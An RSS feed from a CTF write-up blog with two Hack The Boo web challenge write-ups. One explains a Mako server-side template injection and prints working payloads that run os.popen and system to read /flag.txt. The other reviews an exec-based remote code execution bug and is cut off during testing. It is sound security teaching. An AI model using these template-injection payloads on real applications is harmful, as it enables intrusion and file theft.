<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on Soviet's CTF Write-UPs</title><link>/ctf/hacktheboo/web/</link><description>Recent content in Web on Soviet's CTF Write-UPs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 06 Nov 2022 19:25:08 +0100</lastBuildDate><atom:link href="/ctf/hacktheboo/web/index.xml" rel="self" type="application/rss+xml"/><item><title>Spookifier</title><link>/ctf/hacktheboo/web/spookifier/</link><pubDate>Sun, 06 Nov 2022 19:25:08 +0100</pubDate><guid>/ctf/hacktheboo/web/spookifier/</guid><description>Server-Side Template Injection vulnerability in flask application with Mako template system</description><content>&lt;section class="attachments">
&lt;label>Attachments&lt;/label>
&lt;div class="attachments-files">&lt;ul>&lt;li>
&lt;a class="tooltipped tooltipped-n" aria-label="Download" href="/ctf/hacktheboo/web/spookifier/files/web_spookifier.zip" download>web_spookifier.zip&lt;/a>
&lt;a class="new-tab tooltipped tooltipped-n" aria-label="Open in new tab" href="/ctf/hacktheboo/web/spookifier/files/web_spookifier.zip" target="_blank">&lt;/a> &lt;div class="attachment-size">(30kb)&lt;/div>
&lt;/li>&lt;/ul>
&lt;/div>
&lt;/section>
&lt;h1 id="spookifier">Spookifier&lt;/h1>
&lt;blockquote>
&lt;p>There&amp;rsquo;s a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?&lt;/p>
&lt;/blockquote>
&lt;h1 id="information-gathering">Information Gathering&lt;/h1>
&lt;h2 id="the-application-at-a-glance-">The application at-a-glance 🔍&lt;/h2>
&lt;p>Appication generate &amp;ldquo;SpooOOooOOooooooOookkkkkyyyyy&amp;rdquo; names from user input.&lt;/p>
&lt;p>&lt;img src="images/0.png" alt="Untitled">&lt;/p>
&lt;p>&lt;img src="images/1.png" alt="Untitled">&lt;/p>
&lt;h2 id="source-code-review">Source code review&lt;/h2>
&lt;p>All source code was supplied but only relevant parts will be highlighted.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#main.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> flask &lt;span style="color:#f92672">import&lt;/span> Blueprint, request
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> flask_mako &lt;span style="color:#f92672">import&lt;/span> render_template
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> application.util &lt;span style="color:#f92672">import&lt;/span> spookify
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>web &lt;span style="color:#f92672">=&lt;/span> Blueprint(&lt;span style="color:#e6db74">&amp;#39;web&amp;#39;&lt;/span>, __name__)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@web&lt;/span>&lt;span style="color:#f92672">.&lt;/span>route(&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">index&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> text &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>args&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;text&amp;#39;&lt;/span>) &lt;span style="color:#75715e"># Here &amp;#34;text&amp;#34; is user input&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(text):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> converted &lt;span style="color:#f92672">=&lt;/span> spookify(text) &lt;span style="color:#75715e"># And is passed to spookify func without any sanityzation&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> render_template(&lt;span style="color:#e6db74">&amp;#39;index.html&amp;#39;&lt;/span>,output&lt;span style="color:#f92672">=&lt;/span>converted)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> render_template(&lt;span style="color:#e6db74">&amp;#39;index.html&amp;#39;&lt;/span>,output&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In &lt;code>main.py&lt;/code> file &lt;code>text&lt;/code> parameter from URL is directly passed to &lt;code>spookify&lt;/code> function without sanityzation. After function &lt;code>spookify&lt;/code> return it is rendered as template.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">spookify&lt;/span>(text):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> converted_fonts &lt;span style="color:#f92672">=&lt;/span> change_font(text_list&lt;span style="color:#f92672">=&lt;/span>text)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> generate_render(converted_fonts&lt;span style="color:#f92672">=&lt;/span>converted_fonts)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>spookify&lt;/code> function calls &lt;code>change_font&lt;/code> func and passed &lt;code>text&lt;/code> parameter still no sanitization. After &lt;code>change_font&lt;/code> return it is rendered and returned.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">change_font&lt;/span>(text_list):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> text_list &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#f92672">*&lt;/span>text_list]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> current_font &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> all_fonts &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">lambda&lt;/span> text,font_type : (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [current_font&lt;span style="color:#f92672">.&lt;/span>append(globals()[font_type]&lt;span style="color:#f92672">.&lt;/span>get(i, &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> text], all_fonts&lt;span style="color:#f92672">.&lt;/span>append(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(current_font)), current_font&lt;span style="color:#f92672">.&lt;/span>clear()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ) &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font1&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font2&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font3&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font4&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> all_fonts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Function &lt;code>change_font&lt;/code> still do not sanitizate data.&lt;/p>
&lt;h1 id="the-bug">The Bug&lt;/h1>
&lt;p>Application lack sanitization. User input is directly passed to template engine allowing to SSTI (Server Side Template Injection) attack to happend.&lt;/p>
&lt;h1 id="exploitation">Exploitation&lt;/h1>
&lt;h2 id="execution">Execution&lt;/h2>
&lt;p>Payload: &lt;code>${self.module.cache.util.os.popen(&amp;quot;cat+/flag.txt&amp;quot;).read()}&lt;/code>&lt;/p>
&lt;p>&lt;a href="https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/">Python context free payloads in Mako templates&lt;/a>&lt;/p>
&lt;p>&lt;img src="images/Untitled%202.png" alt="Untitled">&lt;/p>
&lt;h2 id="explanation">Explanation&lt;/h2>
&lt;h3 id="why-this-is-even-possible">Why this is even possible?&lt;/h3>
&lt;p>Application fully trust user to not supply any malicious input. By that do not validate input data. This allows attacker or any malicious actor to take advantage of running application.&lt;/p>
&lt;h3 id="payload">Payload&lt;/h3>
&lt;p>&lt;code>${self.module.cache.util.os.popen(&amp;quot;cat+/flag.txt&amp;quot;).read()}&lt;/code>&lt;/p>
&lt;p>To understand why code execute and why it looks slightly different from article mentioned earlier payload could be understand as:&lt;/p>
&lt;ul>
&lt;li>&lt;code>self&lt;/code> this references module that legitimate code execute output of &lt;code>${self}&lt;/code> is &lt;code>&amp;lt;mako.runtime.TemplateNamespace object at 0x7f93963278b0&amp;gt;&lt;/code>&lt;/li>
&lt;li>&lt;code>module&lt;/code> this is current loaded module &lt;code>&amp;lt;module 'memory:0x7f93961eec70'&amp;gt;&lt;/code>&lt;/li>
&lt;li>&lt;code>cache&lt;/code> is &lt;code>mako&lt;/code> template function module &lt;code>&amp;lt;module 'mako.cache' from '/usr/local/lib/python3.8/site-packages/mako/cache.py'&amp;gt;&lt;/code>&lt;/li>
&lt;li>&lt;code>util&lt;/code> is another mako module and it is importig &lt;code>os&lt;/code> module built-in python module allowing to execute shell commands&lt;/li>
&lt;li>&lt;code>os&lt;/code> this allows to execute commands on system &lt;code>&amp;lt;module 'os' from '/usr/local/lib/python3.8/os.py'&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>All those modules are imported like &lt;code>self&lt;/code> importnig &lt;code>module&lt;/code>, &lt;code>module&lt;/code> importing cache etc.&lt;/p>
&lt;p>By this time payload looks something like &lt;code>${self.module.cache.util.os}&lt;/code> which translate&lt;/p>
&lt;p>From module I currently execute code go to one of my imports &lt;code>module&lt;/code> from that go to one of module imports named &lt;code>cache&lt;/code> from &lt;code>cache&lt;/code> go to his &lt;code>util&lt;/code> imports, from that go to &lt;code>os&lt;/code> import.&lt;/p>
&lt;p>From that point there is possibility to use all functions from &lt;code>os&lt;/code> built-in library.&lt;/p>
&lt;p>For example &lt;code>system()&lt;/code> so full payload looks: &lt;code>${self.module.cache.util.os.system('id')}&lt;/code>&lt;/p>
&lt;p>&lt;img src="images/Untitled%203.png" alt="Untitled">&lt;/p>
&lt;p>And it returned 0. Looks like root right? Not exactly.&lt;/p>
&lt;p>If command is &lt;code>whoami&lt;/code> it is still 0. Python system command return &lt;code>exit code&lt;/code> not exactly of command output.&lt;/p>
&lt;p>&lt;img src="images/Untitled%204.png" alt="Untitled">&lt;/p>
&lt;p>To read &lt;code>stdout&lt;/code> of executed command &lt;code>popen()&lt;/code> function need to be used.&lt;/p>
&lt;p>With payload as: &lt;code>${self.module.cache.util.os.popen('whoami')}&lt;/code>&lt;/p>
&lt;p>We got something different &lt;code>os object&lt;/code>&lt;/p>
&lt;p>&lt;code>read()&lt;/code> function can be used to get output we want.&lt;/p>
&lt;p>&lt;img src="images/Untitled%205.png" alt="Untitled">&lt;/p>
&lt;p>With payload as: &lt;code>${self.module.cache.util.os.popen('whoami').read()}&lt;/code>&lt;/p>
&lt;p>&lt;img src="images/Untitled%206.png" alt="Untitled">&lt;/p>
&lt;p>In &lt;code>Docker&lt;/code> file flag is copied to &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;p>With paylaod as: &lt;code>${self.module.cache.util.os.popen('cat+/flag.txt').read()}&lt;/code>&lt;/p>
&lt;p>&lt;img src="images/Untitled%207.png" alt="Untitled">&lt;/p>
&lt;h1 id="flag">Flag&lt;/h1>
&lt;p>&lt;code>HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}&lt;/code>&lt;/p></content></item><item><title>Web Evaluation Check</title><link>/ctf/hacktheboo/web/web-evaluation-check/</link><pubDate>Sun, 06 Nov 2022 19:25:08 +0100</pubDate><guid>/ctf/hacktheboo/web/web-evaluation-check/</guid><description>Remote Code Execution vulnerability by unsafe usage of exec function</description><content>&lt;section class="attachments">
&lt;label>Attachments&lt;/label>
&lt;div class="attachments-files">&lt;ul>&lt;li>
&lt;a class="tooltipped tooltipped-n" aria-label="Download" href="/ctf/hacktheboo/web/web-evaluation-check/files/web_evaluation_deck.zip" download>web_evaluation_deck.zip&lt;/a>
&lt;a class="new-tab tooltipped tooltipped-n" aria-label="Open in new tab" href="/ctf/hacktheboo/web/web-evaluation-check/files/web_evaluation_deck.zip" target="_blank">&lt;/a> &lt;div class="attachment-size">(4918kb)&lt;/div>
&lt;/li>&lt;/ul>
&lt;/div>
&lt;/section>
&lt;h1 id="web-evaluation-deck">Web evaluation deck&lt;/h1>
&lt;h1 id="information-gathering">Information Gathering&lt;/h1>
&lt;h2 id="the-application-at-a-glance-">The application at-a-glance 🔍&lt;/h2>
&lt;p>Application is a card game that allows users to flip 8 cards.&lt;/p>
&lt;p>&lt;img src="images/Untitled.png" alt="Untitled">&lt;/p>
&lt;p>If HP bar is depleted game is won.&lt;/p>
&lt;p>&lt;img src="images/Untitled%201.png" alt="Untitled">&lt;/p>
&lt;p>At first glance there is no visible bug or vulnerability.&lt;/p>
&lt;h2 id="source-code-review">Source code review&lt;/h2>
&lt;p>All of the source code was too big to upload here so only flask source code is stored, without images and other static files.&lt;/p>
&lt;p>Only interesting file is &lt;code>routes.py&lt;/code> as this file store all the logic used by application.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> flask &lt;span style="color:#f92672">import&lt;/span> Blueprint, render_template, request
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> application.util &lt;span style="color:#f92672">import&lt;/span> response
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>web &lt;span style="color:#f92672">=&lt;/span> Blueprint(&lt;span style="color:#e6db74">&amp;#39;web&amp;#39;&lt;/span>, __name__)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>api &lt;span style="color:#f92672">=&lt;/span> Blueprint(&lt;span style="color:#e6db74">&amp;#39;api&amp;#39;&lt;/span>, __name__)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@web&lt;/span>&lt;span style="color:#f92672">.&lt;/span>route(&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">index&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> render_template(&lt;span style="color:#e6db74">&amp;#39;index.html&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@api&lt;/span>&lt;span style="color:#f92672">.&lt;/span>route(&lt;span style="color:#e6db74">&amp;#39;/get_health&amp;#39;&lt;/span>, methods&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;POST&amp;#39;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">count&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>is_json:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> response(&lt;span style="color:#e6db74">&amp;#39;Invalid JSON!&amp;#39;&lt;/span>), &lt;span style="color:#ae81ff">400&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>get_json()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> current_health &lt;span style="color:#f92672">=&lt;/span> data&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;current_health&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attack_power &lt;span style="color:#f92672">=&lt;/span> data&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;attack_power&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> operator &lt;span style="color:#f92672">=&lt;/span> data&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;operator&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> current_health &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> attack_power &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> operator:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> response(&lt;span style="color:#e6db74">&amp;#39;All fields are required!&amp;#39;&lt;/span>), &lt;span style="color:#ae81ff">400&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> compile(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;result = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(current_health)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>operator&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(attack_power)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exec&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exec(code, result) &lt;span style="color:#75715e">#exec function allows to execute python code&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> response(result&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> response(&lt;span style="color:#e6db74">&amp;#39;Something Went Wrong!&amp;#39;&lt;/span>), &lt;span style="color:#ae81ff">500&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>First interesting thing is that this application uses &lt;code>compile&lt;/code> and &lt;code>exec&lt;/code> function.&lt;/p>
&lt;p>Lets analyze the given source code.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>get_json()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> current_health &lt;span style="color:#f92672">=&lt;/span> data&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;current_health&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attack_power &lt;span style="color:#f92672">=&lt;/span> data&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;attack_power&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> operator &lt;span style="color:#f92672">=&lt;/span> data&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;operator&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This piece of code parse &lt;code>POST&lt;/code> body and get &lt;code>current_health&lt;/code> , &lt;code>attack_power&lt;/code> and &lt;code>operator&lt;/code> parameters.&lt;/p>
&lt;p>Next step is checking if all three variables are set this is the same as checking if all three parameters are passed in request.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> current_health &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> attack_power &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> operator:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> response(&lt;span style="color:#e6db74">&amp;#39;All fields are required!&amp;#39;&lt;/span>), &lt;span style="color:#ae81ff">400&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This part is most interesting because of use &lt;code>exec&lt;/code> function.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> compile(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;result = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(current_health)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>operator&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(attack_power)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exec&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exec(code, result) &lt;span style="color:#75715e">#exec function allows to execute python code&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> response(result&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> response(&lt;span style="color:#e6db74">&amp;#39;Something Went Wrong!&amp;#39;&lt;/span>), &lt;span style="color:#ae81ff">500&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>But before &lt;code>exec&lt;/code> function call, user input is directly passed to &lt;code>compile&lt;/code> function and then to &lt;code>exec&lt;/code> and &lt;code>current_health&lt;/code> and &lt;code>attack_power&lt;/code> are casted to &lt;code>int&lt;/code> . &lt;code>result&lt;/code> variable are returned to the user in response.&lt;/p>
&lt;h1 id="the-vulnerability">The Vulnerability&lt;/h1>
&lt;p>As there is no sanitization of user input there is possible RCE (Remote Code Execution) via &lt;code>exec&lt;/code> function!&lt;/p>
&lt;h2 id="testing">Testing&lt;/h2>
&lt;p>As I’m not familliar with &lt;code>compile()/exec()&lt;/code> function I copied relevant part of code to new python script for testing.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>current_health &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;12&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>operator &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;+&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>attack_power &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;100&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> compile(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;result = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(current_health)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>operator&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(attack_power)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exec&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exec(code, result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(result&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;Something Went Wrong!&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After executing this script number &lt;code>112&lt;/code> shows up.&lt;/p>
&lt;p>&lt;img src="images/Untitled%202.png" alt="Untitled">&lt;/p>
&lt;p>&lt;code>exec&lt;/code> function is capable of executing python code. User controls all three parameters but only &lt;code>operator&lt;/code> is passed directly to &lt;code>compile&lt;/code> rest parameters are converted to &lt;code>int&lt;/code>&lt;/p>
